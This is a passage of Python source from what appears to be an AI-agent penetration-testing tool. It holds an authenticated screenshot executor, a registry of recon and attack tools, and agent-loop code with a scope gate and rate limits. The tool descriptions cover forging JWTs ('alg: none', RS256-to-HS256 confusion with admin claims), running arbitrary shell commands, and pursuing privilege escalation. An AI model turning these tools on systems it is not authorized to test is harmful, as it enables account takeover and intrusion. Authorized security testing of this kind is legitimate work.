                custom_headers.setdefault(k, str(v))
        saved_token = target.state.get("auth_token") or target.state.get("forged_token")
        if saved_token and "Authorization" not in custom_headers:
            custom_headers["Authorization"] = f"Bearer {saved_token}"

    # Build cookie header if cookies present
    if cookies_dict:
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
        if not any(k.lower() == "cookie" for k in custom_headers):
            custom_headers["Cookie"] = cookie_header

    merged_headers = merge_global_context({"global_headers": custom_headers})

    chrome_bin = _find_binary("chromium") or _find_binary("google-chrome") or _find_binary("chrome")
    chromedriver_bin = _find_binary("chromedriver")

    captured_items: List[Dict[str, Any]] = []

    # Attempt 1: High-fidelity Selenium + CDP pre-navigation cookie/header injection
    selenium_success = False
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.chrome.options import Options
        from urllib.parse import urlparse

        if chrome_bin and chromedriver_bin:
            opts = Options()
            opts.binary_location = chrome_bin
            opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--window-size=1440,900")
            opts.add_argument("--ignore-certificate-errors")

            service = Service(executable_path=chromedriver_bin)
            driver = webdriver.Chrome(service=service, options=opts)
            try:
                for target_url in target_urls:
                    parsed_u = urlparse(target_url)
                    host = parsed_u.hostname or ""

                    driver.execute_cdp_cmd("Network.enable", {})

                    non_cookie_headers = {k: v for k, v in merged_headers.items() if k.lower() != "cookie"}
                    if non_cookie_headers:
                        driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {"headers": non_cookie_headers})

                    if cookies_dict and host:
                        for c_k, c_v in cookies_dict.items():
                            try:
                                driver.execute_cdp_cmd("Network.setCookie", {
                                    "name": c_k,
                                    "value": c_v,
                                    "domain": host,
                                    "path": "/",
                                    "secure": target_url.startswith("https"),
                                    "httpOnly": False
                                })
                            except Exception:
                                pass

                    driver.get(target_url)

                    # Inject token into localStorage / sessionStorage for SPAs
                    auth_tok = target.state.get("auth_token") or target.state.get("forged_token") if hasattr(target, "state") and isinstance(target.state, dict) else None
                    if auth_tok:
                        try:
                            driver.execute_script('''
                                try {
                                    localStorage.setItem('token', arguments[0]);
                                    localStorage.setItem('auth_token', arguments[0]);
                                    localStorage.setItem('jwt', arguments[0]);
                                    sessionStorage.setItem('token', arguments[0]);
                                } catch(e) {}
                            ''', auth_tok)
                        except Exception:
                            pass

                    import time
                    time.sleep(max(1, delay))

                    safe_slug = re.sub(r'[^a-zA-Z0-9_\-\.]', '-', target_url).strip('-')
                    if not safe_slug:
                        safe_slug = "screenshot"
                    out_file = screenshots_dir / f"{safe_slug}.png"

                    if fullpage:
                        try:
                            total_height = driver.execute_script("return Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, 900);")
                            driver.set_window_size(1440, min(int(total_height), 8000))
                            time.sleep(0.3)
                        except Exception:
                            pass

                    driver.save_screenshot(str(out_file))

                    page_text = ""
                    try:
                        page_text = driver.find_element("tag name", "body").text or ""
                    except Exception:
                        page_text = driver.page_source or ""

                    lower_text = page_text.lower()
                    lower_title = (driver.title or "").lower()

                    access_denied_signals = []
                    for phrase in [
                        "403", "401", "owner access required", "access denied",
                        "restricted to workspace owners", "restricted to owners",
                        "restricted to administrators", "admin access required",
                        "unauthorized", "permission denied", "forbidden",
                        "sign in to continue", "log in to your account"
                    ]:
                        if phrase in lower_title or phrase in lower_text:
                            access_denied_signals.append(phrase)

                    access_verdict = "DENIED / RESTRICTED" if access_denied_signals else "SUCCESS / ACCESSIBLE"

                    item_info = {
                        "url": target_url,
                        "final_url": driver.current_url or target_url,
                        "title": driver.title or target_url,
                        "response_code": 200,
                        "access_verdict": access_verdict,
                        "access_denied_signals": list(set(access_denied_signals)),
                        "file_path": str(out_file),
                        "file_name": out_file.name,
                        "file_size": out_file.stat().st_size if out_file.exists() else 0,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "technologies": [],
                    }
                    if access_denied_signals:
                        item_info["warning"] = f"PAGE INDICATES ACCESS RESTRICTION: Found '{', '.join(set(access_denied_signals))}'. This endpoint is NOT fully unlocked."
                    captured_items.append(item_info)
                selenium_success = True
            finally:
                try:
                    driver.quit()
                except Exception:
                    pass
    except Exception:
        selenium_success = False

    # Attempt 2: Fallback to gowitness binary if Selenium was not available or failed
    if not selenium_success:
        auto_install = bool(load_config().get("auto_install_missing_tools", False))
        check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
        binary = get_binary_path("gowitness") or "gowitness"

        if check["available"]:
            import tempfile
            with tempfile.TemporaryDirectory() as tmp_dir:
                jsonl_path = Path(tmp_dir) / "gowitness_results.jsonl"
                cookie_header = merged_headers.get("Cookie")

                if len(target_urls) == 1:
                    target_url = target_urls[0]
                    cmd = [
                        binary, "scan", "single",
                        "-u", target_url,
                        "-s", str(screenshots_dir),
                        "--screenshot-format", "png",
                        "--delay", str(delay),
                        "--write-jsonl",
                        "--write-jsonl-file", str(jsonl_path),
                    ]
                    if fullpage:
                        cmd.append("--screenshot-fullpage")
                    if chrome_bin:
                        cmd.extend(["--chrome-path", chrome_bin])
                    for h_k, h_v in merged_headers.items():
                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
                    if cookie_header:
                        clean_cookie = cookie_header.replace("'", "\\'")
                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])

                    try:
                        subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    except Exception as e:
                        return {"error": f"gowitness execution failed: {e}", "url": target_url}
                else:
                    targets_file = Path(tmp_dir) / "targets.txt"
                    targets_file.write_text("\n".join(target_urls) + "\n")
                    cmd = [
                        binary, "scan", "file",
                        "-f", str(targets_file),
                        "-s", str(screenshots_dir),
                        "--screenshot-format", "png",
                        "--delay", str(delay),
                        "--write-jsonl",
                        "--write-jsonl-file", str(jsonl_path),
                    ]
                    if fullpage:
                        cmd.append("--screenshot-fullpage")
                    if chrome_bin:
                        cmd.extend(["--chrome-path", chrome_bin])
                    for h_k, h_v in merged_headers.items():
                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
                    if cookie_header:
                        clean_cookie = cookie_header.replace("'", "\\'")
                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])

                    try:
                        subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    except Exception as e:
                        return {"error": f"gowitness batch execution failed: {e}", "urls": target_urls}

                if jsonl_path.exists():
                    for line in jsonl_path.read_text().splitlines():
                        if not line.strip():
                            continue
                        try:
                            data = json.loads(line)
                            fname = data.get("file_name", "")
                            screenshot_file = str(screenshots_dir / fname) if fname else ""
                            if not (screenshot_file and os.path.exists(screenshot_file)):
                                for f in screenshots_dir.glob("*.png"):
                                    if fname and str(f).endswith(fname):
                                        screenshot_file = str(f)
                                        break

                            item_info = {
                                "url": data.get("url", ""),
                                "final_url": data.get("final_url", ""),
                                "title": data.get("title", ""),
                                "response_code": data.get("response_code", 0),
                                "file_path": screenshot_file,
                                "file_name": fname,
                                "timestamp": datetime.now(timezone.utc).isoformat(),
                                "technologies": [t.get("value") for t in data.get("technologies", []) if isinstance(t, dict) and t.get("value")],
                            }
                            if screenshot_file and os.path.exists(screenshot_file):
                                item_info["file_size"] = os.path.getsize(screenshot_file)
                            captured_items.append(item_info)
                        except Exception:
                            continue

    # Fallback to directory scan if jsonl parsing was empty
    if not captured_items:
        for f in screenshots_dir.glob("*.png"):
            captured_items.append({
                "url": target_urls[0] if target_urls else target.name,
                "file_path": str(f),
                "file_name": f.name,
                "file_size": f.stat().st_size,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

    if captured_items:
        update_from_gowitness(target, captured_items)
        save_target(target)

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Gowitness captured {len(captured_items)} screenshot(s) in {screenshots_dir}")

    denied_items = [it for it in captured_items if it.get("access_verdict") == "DENIED / RESTRICTED" or it.get("warning")]
    result_payload: Dict[str, Any] = {
        "status": "success",
        "screenshots_count": len(captured_items),
        "screenshots_dir": str(screenshots_dir),
        "screenshots": captured_items
    }
    if denied_items:
        result_payload["access_verification_warning"] = (
            "CRITICAL: One or more captured screenshots display ACCESS DENIAL or RESTRICTION banners "
            "(e.g. '403 · Owner access required', 'Forbidden', 'Access Denied'). "
            "The active session has NOT achieved administrative/owner access on these routes. "
            "Do NOT record this as a successful privilege escalation. Continue testing alternative vectors (e.g. Mass Assignment, nested property injection, client JS analysis)."
        )

    return result_payload


def _execute_record_finding(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Logs a finding YOU have already confirmed (not a guess or a plan) into
    structured investigation memory — evidence cards, timeline, and the
    running investigation summary the orchestrator sees on every later turn.
    This does not test anything itself; it only records a result you
    already obtained via curl/spider/other tools.
    """
    title = str(args.get("title", "")).strip()
    if not title:
        return {"error": "title is required — describe the confirmed finding in one line."}
    kind = str(args.get("kind", "interesting_endpoint")).strip().lower()
    severity = str(args.get("severity", "medium")).strip().lower()
    request_ref = str(args.get("request_ref", "")).strip()
    note = str(args.get("note", "")).strip()

    finding = {"type": title, "target": request_ref, "severity": severity, "note": note}
    try:
        update_from_bac(target, findings=[finding])
        save_target(target)
    except Exception as e:
        return {"error": f"Failed to record finding: {e}"}

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Finding recorded: {title}")
    return {"status": "recorded", "title": title, "kind": kind, "severity": severity}


# Tool Registry Map
TOOL_REGISTRY: Dict[str, ToolSpec] = {
    "record_finding": ToolSpec(
        name="record_finding",
        description="Log a finding you have ALREADY CONFIRMED (via curl/spider/other tools — not a plan or a guess) into the investigation's structured memory, so it persists across turns and feeds the running investigation summary. Use this once you've verified something real: a confirmed IDOR, a role you successfully escalated to, a token leak, etc. Do not use this to record intentions or untested hypotheses.",
        parameters={
            "type": "object",
            "properties": {
                "title": {"type": "string", "description": "One-line description of the confirmed finding, e.g. 'IDOR: account B's invoices readable from account A session'."},
                "kind": {"type": "string", "description": "Category, e.g. 'idor', 'auth_bypass', 'mass_assignment', 'interesting_endpoint'. Free text.", "default": "interesting_endpoint"},
                "severity": {"type": "string", "description": "Your assessed severity: critical, high, medium, or low.", "default": "medium"},
                "request_ref": {"type": "string", "description": "The URL/endpoint the finding applies to."},
                "note": {"type": "string", "description": "Optional extra detail — the specific request/response evidence that confirmed it."}
            },
            "required": ["title"]
        },
        executor=_execute_record_finding
    ),
    "gowitness": ToolSpec(
        name="gowitness",
        description="Capture high-fidelity visual web screenshots of URLs or endpoints using gowitness. Automatically saves screenshots to target workspace (~/.hellhound/targets/<target>/screenshots/) and indexes them into target investigation memory & visual evidence cards. Supports session cookies & custom headers to screenshot authenticated member portals and admin dashboards for vulnerability PoC.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to capture screenshot for (e.g. https://target.com/dashboard or https://target.com/admin)."},
                "urls": {"type": "array", "items": {"type": "string"}, "description": "Optional list of multiple target URLs to screenshot in batch."},
                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Cookie': 'session=abc123', 'Authorization': 'Bearer ...'})."},
                "cookies": {"type": "object", "description": "Optional session cookies dictionary or cookie string to screenshot authenticated pages."},
                "fullpage": {"type": "boolean", "description": "Capture full scrollable page instead of standard viewport (default: false).", "default": False},
                "delay": {"type": "integer", "description": "Delay in seconds before capturing to allow JavaScript rendering (default: 2).", "default": 2},
                "output_dir": {"type": "string", "description": "Optional custom directory path to save screenshots (defaults to target workspace)."}
            },
            "required": ["url"]
        },
        executor=_execute_gowitness
    ),
    "subfinder": ToolSpec(
        name="subfinder",
        description="Enumerate subdomains for a domain using passive sources and certificate transparency logs. (Do NOT use on CTF/lab/private targets like *.ctfio.com or *.htb — use dns_bruteforce or httpx directly).",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target root domain to enumerate subdomains for."}
            },
            "required": ["domain"]
        },
        executor=_execute_subfinder
    ),
    "httpx": ToolSpec(
        name="httpx",
        description="Probe live web services, status codes, page titles, and web technology stack.",
        parameters={
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target domain, URL, or list of subdomains to probe."}
            },
            "required": ["target"]
        },
        executor=_execute_httpx
    ),
    "subzy": ToolSpec(
        name="subzy",
        description="Verify CNAME records and test for potential dangling DNS subdomain takeover vulnerabilities.",
        parameters={
            "type": "object",
            "properties": {
                "subdomain": {"type": "string", "description": "Subdomain to verify for takeover vulnerability."}
            },
            "required": ["subdomain"]
        },
        executor=_execute_subzy
    ),
    "takeover_scanner": ToolSpec(
        name="takeover_scanner",
        description="Active CNAME/fingerprint-based subdomain takeover scanner targeting AWS, GitHub Pages, Heroku, Shopify, etc.",
        parameters={
            "type": "object",
            "properties": {
                "subdomains": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "List of subdomains to scan. Defaults to all active target subdomains."
                }
            }
        },
        executor=_execute_takeover_scanner
    ),
    "hackerone_search": ToolSpec(
        name="hackerone_search",
        description="Search HackerOne Hacktivity for disclosed reports to learn about past vulnerability classes on the target or industry.",
        parameters={
            "type": "object",
            "properties": {
                "keyword": {"type": "string", "description": "Search term (e.g. ssrf, bypass, subdomain takeover)."},
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."},
                "limit": {"type": "integer", "description": "Max results to return (default: 10).", "default": 10}
            }
        },
        executor=_execute_hackerone_search
    ),
    "hackerone_policy": ToolSpec(
        name="hackerone_policy",
        description="Retrieve public policy, safe harbor terms, and in-scope asset identifiers for a HackerOne program.",
        parameters={
            "type": "object",
            "properties": {
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."}
            },
            "required": ["program"]
        },
        executor=_execute_hackerone_policy
    ),
    "hackerone_stats": ToolSpec(
        name="hackerone_stats",
        description="Retrieve public program statistics (bounty ranges, response times, resolved report counts) for a HackerOne program.",
        parameters={
            "type": "object",
            "properties": {
                "program": {"type": "string", "description": "HackerOne program handle (e.g. shopify)."}
            },
            "required": ["program"]
        },
        executor=_execute_hackerone_stats
    ),
    "dig": ToolSpec(
        name="dig",
        description="Perform non-destructive DNS queries for A, CNAME, TXT, MX, and NS records.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to resolve."},
                "type": {"type": "string", "description": "DNS record type: A, CNAME, TXT, MX, NS", "default": "A"}
            },
            "required": ["domain"]
        },
        executor=_execute_dig
    ),
    "curl": ToolSpec(
        name="curl",
        description="Fetch HTTP response headers and body preview for an endpoint with standard BugBounty identity headers. Supports GET, POST, PUT, DELETE with custom headers, cookies, JSON objects, and string payloads.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Full URL to request."},
                "method": {"type": "string", "description": "HTTP Method: GET, HEAD, POST, PUT, DELETE", "default": "GET"},
                "headers": {"type": "object", "description": "Optional custom HTTP headers dictionary (e.g. {'Content-Type': 'application/json', 'Cookie': 'session=...'})."},
                "cookies": {"type": "object", "description": "Optional cookies dictionary or string."},
                "json": {"type": "object", "description": "JSON payload object to send in the request body (automatically sets Content-Type: application/json)."},
                "data": {"type": "string", "description": "Raw string payload or URL-encoded form data to send in request body."}
            },
            "required": ["url"]
        },
        executor=_execute_curl
    ),
    "jwt_forge": ToolSpec(
        name="jwt_forge",
        description="Decode and forge JSON Web Tokens (JWTs) for privilege escalation and auth bypass testing. Only applicable when a valid 3-part 'eyJ...' JWT token is present in the target response or Authorization header. Do NOT use on opaque session cookies (sess_..., connect.sid, PHPSESSID). Generates 'alg: none' unsigned tokens and RSA-to-HMAC (RS256->HS256) algorithm confusion tokens with elevated claims (e.g. role: admin), and automatically updates session state for subsequent tool calls.",
        parameters={
            "type": "object",
            "properties": {
                "token": {
                    "type": "string",
                    "description": "Original JWT string to base forgery on. If omitted, uses active session token from target state."
                },
                "claims": {
                    "type": "object",
                    "description": "Key-value dictionary of claims to modify or add (e.g. {'role': 'admin', 'isAdmin': true, 'admin': true}). Default: {'role': 'admin'}."
                },
                "algorithm": {
                    "type": "string",
                    "description": "Algorithm to forge: 'none' (unsigned), 'HS256' (algorithm confusion), or 'all' (default: 'all').",
                    "default": "all"
                },
                "public_key_or_secret": {
                    "type": "string",
                    "description": "RSA Public Key PEM string or HMAC secret key for HS256 signing (optional)."
                }
            }
        },
        executor=_execute_jwt_forge
    ),
    "spider": ToolSpec(
        name="spider",
        description="Crawl target web application to discover endpoints, URL parameters, form fields, and JavaScript assets. Supports authenticated crawling with session cookies or Authorization headers.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to crawl."},
                "depth": {"type": "integer", "description": "Crawl recursion depth (default: 2)", "default": 2},
                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Authorization': 'Bearer ...'})."},
                "cookies": {"type": "object", "description": "Optional session cookies string or dictionary to crawl authenticated pages."}
            },
            "required": ["url"]
        },
        executor=_execute_spider
    ),
    "wafbuster": ToolSpec(
        name="wafbuster",
        description="Detect WAF / CDN signatures and security headers on the target web application.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to inspect for WAF presence."}
            },
            "required": ["url"]
        },
        executor=_execute_wafbuster
    ),
    "surface_auditor": ToolSpec(
        name="surface_auditor",
        description="Discover exposed API routes, documentation endpoints (OpenAPI/Swagger), and sensitive files.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target web application URL to audit."}
            },
            "required": ["url"]
        },
        executor=_execute_surface_auditor
    ),
    "cors_checker": ToolSpec(
        name="cors_checker",
        description="Audit CORS policy for arbitrary origin reflection and credential exposure.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Endpoint URL to test for CORS misconfiguration."}
            },
            "required": ["url"]
        },
        executor=_execute_cors_checker
    ),
    "graphql_probe": ToolSpec(
        name="graphql_probe",
        description="Detect GraphQL endpoints and check for public introspection availability.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to probe for GraphQL schema."}
            },
            "required": ["url"]
        },
        executor=_execute_graphql_probe
    ),
    "dns_bruteforce": ToolSpec(
        name="dns_bruteforce",
        description=(
            "Active DNS brute-force via shuffledns (massdns-backed with wildcard handling) — use this when passive "
            "subfinder returns few or no results, especially for internal, private, or non-publicly-indexed targets "
            "(e.g. CTF/lab domains) where certificate transparency logs won't have anything indexed."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Root domain to brute-force."}
            },
            "required": ["domain"]
        },
        executor=_execute_shuffledns
    ),
    "vhost_fuzz": ToolSpec(
        name="vhost_fuzz",
        description=(
            "Virtual-host fuzzing via ffuf — finds sites sharing an IP that don't "
            "have their own DNS entry, common on CTF infrastructure and internal "
            "environments where multiple challenges/apps share one host."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Base domain for the Host header."},
                "target_ip": {"type": "string", "description": "IP or URL to fuzz against."}
            },
            "required": ["domain", "target_ip"]
        },
        executor=_execute_ffuf_vhost
    ),
    "port_scan": ToolSpec(
        name="port_scan",
        description="Active TCP/UDP port scanner via naabu to discover open ports and non-standard web service ports.",
        parameters={
            "type": "object",
            "properties": {
                "hosts": {"type": "string", "description": "Target host, IP, domain, or comma-separated list of hosts to scan ports for."},
                "ports": {"type": "string", "description": "Ports to scan (e.g. 'top-100', 'top-1000', 'full', '80,443,8000-9000')", "default": "top-100"}
            },
            "required": ["hosts"]
        },
        executor=_execute_port_scan
    ),
    "permute_subdomains": ToolSpec(
        name="permute_subdomains",
        description="Generate subdomain mutations and permutations via alterx based on known subdomains or patterns.",
        parameters={
            "type": "object",
            "properties": {
                "subdomains": {"type": "array", "items": {"type": "string"}, "description": "List of discovered subdomains to generate permutations from."},
                "limit": {"type": "integer", "description": "Maximum number of candidate permutations to generate (default: 500)", "default": 500}
            },
            "required": ["subdomains"]
        },
        executor=_execute_permute_subdomains
    ),
    "resolve_candidates": ToolSpec(
        name="resolve_candidates",
        description="Fast bulk DNS resolution and filtering via dnsx to identify live resolvable domains and IP mappings.",
        parameters={
            "type": "object",
            "properties": {
                "candidates": {"type": "array", "items": {"type": "string"}, "description": "List of candidate domain names or permutations to resolve."}
            },
            "required": ["candidates"]
        },
        executor=_execute_resolve_candidates
    ),
    "tls_cert_scan": ToolSpec(
        name="tls_cert_scan",
        description="Scan TLS/SSL certificates and extract Subject Alternative Names (SANs) and Common Names (CNs) via tlsx.",
        parameters={
            "type": "object",
            "properties": {
                "hosts": {"type": "string", "description": "Target host, domain, or comma-separated list of hosts to inspect TLS certificates for."},
                "port": {"type": "string", "description": "Port to connect for TLS handshake (default: 443)", "default": "443"}
            },
            "required": ["hosts"]
        },
        executor=_execute_tls_cert_scan
    ),
    "content_discovery": ToolSpec(
        name="content_discovery",
        description="Active path and directory discovery fuzzing via ffuf on live web endpoints to reveal hidden routes and assets.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL of the target application to fuzz."}
            },
            "required": ["url"]
        },
        executor=_execute_ffuf_content
    ),
    "run_terminal_command": ToolSpec(
        name="run_terminal_command",
        description="Run an arbitrary terminal command or Kali tool (e.g., custom nmap, gobuster, sqlmap, custom ffuf pipes) targeting a specific host. You MUST specify the target host parameter for scope validation.",
        parameters={
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The exact shell command line string to execute."},
                "target": {"type": "string", "description": "The target domain, IP, or URL being tested (used for safety scope verification)."}
            },
            "required": ["command", "target"]
        },
        executor=_execute_terminal_command
    ),
    "hydra": ToolSpec(
        name="hydra",
        description="Hydra multi-engine logic & parameter anomaly analyzer — tests endpoints for logic flaws, race conditions, differential parameter handling, and broken access controls.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base target URL to analyze."},
                "concurrency": {"type": "integer", "description": "Number of concurrent workers (default: 10).", "default": 10},
                "enable_probing": {"type": "boolean", "description": "Enable active differential mutation probes (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_hydra
    ),
    "cloudscout": ToolSpec(
        name="cloudscout",
        description="CloudScout cloud asset discovery — identifies AWS S3 buckets, Azure Blob storage, Google Cloud Storage buckets, and Firebase databases exposed in application responses, JS files, or endpoints.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to scan."},
                "verify_public": {"type": "boolean", "description": "Actively check if discovered cloud storage buckets/resources are publicly accessible (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_cloudscout
    ),
    "transport_auditor": ToolSpec(
        name="transport_auditor",
        description="Transport & cookie security auditor — inspects SSL/TLS certificates, cipher suites, HSTS enforcement, and cookie security flags (Secure, HttpOnly, SameSite).",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL or hostname to audit."},
                "check_ssl": {"type": "boolean", "description": "Audit SSL/TLS certificate validity and protocol versions (default: true).", "default": True},
                "check_https": {"type": "boolean", "description": "Audit HTTPS enforcement and HSTS header presence (default: true).", "default": True},
                "check_cookies": {"type": "boolean", "description": "Audit cookie security flags on response headers (default: true).", "default": True},
                "check_payment": {"type": "boolean", "description": "Audit PCI-DSS transport requirements if payment flows detected (default: true).", "default": True}
            },
            "required": ["url"]
        },
        executor=_execute_transport_auditor
    ),
    "fuzz_hunter": ToolSpec(
        name="fuzz_hunter",
        description="FUZZhunter intelligent recursive path discovery — performs deep recursive fuzzing with dynamic 404 similarity calibration and custom wordlists.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to fuzz."},
                "max_depth": {"type": "integer", "description": "Maximum recursive discovery depth (default: 2).", "default": 2},
                "threads": {"type": "integer", "description": "Concurrent HTTP workers (default: 10).", "default": 10},
                "quick": {"type": "boolean", "description": "Quick mode with top-priority wordlist paths only (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_fuzz_hunter
    ),
}


# Capability fast-path removed to allow natural LLM responses


# ==========================================================
# AGENT REASONING & EXECUTION LOOP
# ==========================================================

def extract_path_scope(user_text: str) -> Optional[str]:
    """
    If the user's task text names a specific URL or path
    (e.g. "...from this endpoint https://host/app" or "/app/dashboard"), return that first
    path segment (e.g. "/app") as the task's path scope.

    Multi-tenant hosts (several independent applications or challenges living under
    different top-level paths on the same domain) — a task scoped to one endpoint should
    not wander into the others. Returns None if no path is present (task is domain-wide)
    so nothing is restricted.
    """
    if not user_text:
        return None
    # 1. Full URL check
    m = re.search(r'https?://[^\s"\']+', user_text)
    if m:
        raw_url = m.group(0).rstrip(".,;:!?)>\"'")
        try:
            parsed = urlparse(raw_url)
            path = parsed.path or ""
            segments = [s.strip(".,;:!?)>\"'") for s in path.split("/") if s.strip(".,;:!?)>\"'")]
            if segments:
                return "/" + segments[0]
        except Exception:
            pass

    # 2. Explicit path references like "/app", "/app/dashboard", "/service"
    m_path = re.search(r'(?:^|\s)(/[a-zA-Z0-9_\-\.]+)', user_text)
    if m_path:
        cand = m_path.group(1).rstrip(".,;:!?)>\"'")
        segments = [s for s in cand.split("/") if s]
        if segments and segments[0].lower() not in ("setup", "scope", "target", "recon", "help", "clear", "quit", "exit", "root", "api"):
            return "/" + segments[0]

    return None


def _url_in_path_scope(url: str, path_scope: str) -> bool:
    """True if url's path falls under path_scope (e.g. '/app')."""
    try:
        p = (urlparse(url).path or "").rstrip("/")
        scope = path_scope.rstrip(".,;:!?)>\"'").rstrip("/")
    except Exception:
        return True
    return p == scope or p.startswith(scope + "/")


class Agent:
    def __init__(self, target: Optional[Target] = None):
        self.target = target or create_or_load_target("default")
        self.history: List[Dict[str, str]] = self.target.state.get("history") or []
        if not isinstance(self.history, list):
            self.history = []
        self.guard = AutopilotGuard(
            circuit_threshold=5,
            circuit_cooldown=60.0,
            recon_rps=10.0,
            test_rps=1.0,
            safe_methods_only=True
        )
        self._turn_path_scope: Optional[str] = None  # e.g. "/app" — set per-turn in handle_message

    def set_target(self, target_name: str) -> Target:
        self.target = create_or_load_target(target_name)
        self.history = self.target.state.get("history") or []
        if not isinstance(self.history, list):
            self.history = []
        self._turn_path_scope = None  # Reset path scope to prevent bleeding from previous target
        self.guard = AutopilotGuard(  # Reset circuit breaker and rate limiters for the new target
            circuit_threshold=5,
            circuit_cooldown=60.0,
            recon_rps=10.0,
            test_rps=1.0,
            safe_methods_only=True
        )
        return self.target

    def _get_trimmed_history(self, max_turns: int = 6, for_chat: bool = False, turn_start_idx: Optional[int] = None) -> List[Dict[str, str]]:
        """
        Returns a sanitized history window for LLM/SLM prompts.
        If turn_start_idx is provided, ALL tool results and assistant turns executed in the
        current turn are preserved intact so the orchestrator and synthesizer have complete
        visibility of what tools produced during this run.
        """
        if not self.history:
            return []

        if for_chat:
            chat_turns = []
            for h in reversed(self.history):
                content = str(h.get("content", ""))
                # Skip heavy reports, tool outputs, session summaries, and lengthy blocks
                if (
                    "[TOOL RESULT:" in content
                    or "ALWAYS-ON" in content
                    or "Session Summary" in content
                    or len(content) > 350
                ):
                    continue
                chat_turns.insert(0, {"role": h.get("role", "user"), "content": content.strip()})
                if len(chat_turns) >= max_turns:
                    break
            return chat_turns

        if turn_start_idx is not None and 0 <= turn_start_idx <= len(self.history):
            # Split into prior conversation history and current-turn activity
            prior_history = self.history[:turn_start_idx]
            current_turn_history = self.history[turn_start_idx:]
            # Keep up to max_turns of prior conversational context
            recent_prior = prior_history[-max_turns:] if len(prior_history) > max_turns else prior_history
            combined = recent_prior + current_turn_history
        else:
            combined = self.history[-max_turns:] if len(self.history) > max_turns else self.history

        trimmed = []
        for h in combined:
            content = str(h.get("content", ""))
            is_tool_result = content.startswith("[TOOL RESULT:")
            if is_tool_result:
                # Tool results (curl bodies, spider intel, JSON feeds) are the
                # highest-value content — provide full results up to 25,000 characters
                # so the LLM can extract tokens, IDs, endpoints, and credentials without loss.
                if len(content) > 25000:
                    emails = sorted(set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", content)))
                    prefix = f"[EMAILS FOUND IN THIS RESULT: {', '.join(emails)}]\n" if emails else ""
                    content = prefix + content[:24000] + "\n...[truncated remainder of large output]..."
            elif len(content) > 4000:
                content = content[:3800] + "\n...[truncated]..."
            trimmed.append({"role": h.get("role", "user"), "content": content})
        return trimmed

    def _extract_target_from_args(self, args: Dict[str, Any]) -> str:
        for key in ("domain", "domains", "target", "url", "subdomain", "subdomains", "host", "hosts", "candidates", "request_ref"):
            if key in args and args[key]:
                val = args[key]
                if isinstance(val, list) and val:
                    return str(val[0])
                if isinstance(val, str) and "," in val:
                    return str(val.split(",")[0].strip())
                return str(val)
        return self.target.name

    def execute_tool_call(self, tool_name: str, args: Dict[str, Any], emit: Any = None) -> Dict[str, Any]:
        """
        Executes a tool with hard code-level scope validation, safe method policy,
        circuit breaker checking, and rate-limiting pacing.
        """
        spec = TOOL_REGISTRY.get(tool_name)
        if not spec:
            return {"error": f"Tool '{tool_name}' not found in registry."}

        # Internal memory & finding recording tools operate locally on target state
        if tool_name in ("record_finding", "search_findings", "dismiss_finding", "export_report", "view_evidence", "get_investigation_graph", "ask_memory", "plan_next_steps"):
            return spec.executor(args, self.target, emit)

        target_candidate = self._extract_target_from_args(args)

        # 1. Enforce code-level Scope Gate
        if self.target and self.target.scope_rules and self.target.scope_rules.in_scope:
            allowed, reason = is_in_scope(target_candidate, self.target.scope_rules)
            if not allowed:
                msg = f"[!] SCOPE REFUSAL: Action on '{target_candidate}' blocked. Reason: {reason}"
                if emit and hasattr(emit, "warn"):
                    emit.warn(msg)
                return {
                    "error": f"SCOPE_VIOLATION: {reason}",
                    "target": target_candidate,
                    "blocked": True
                }

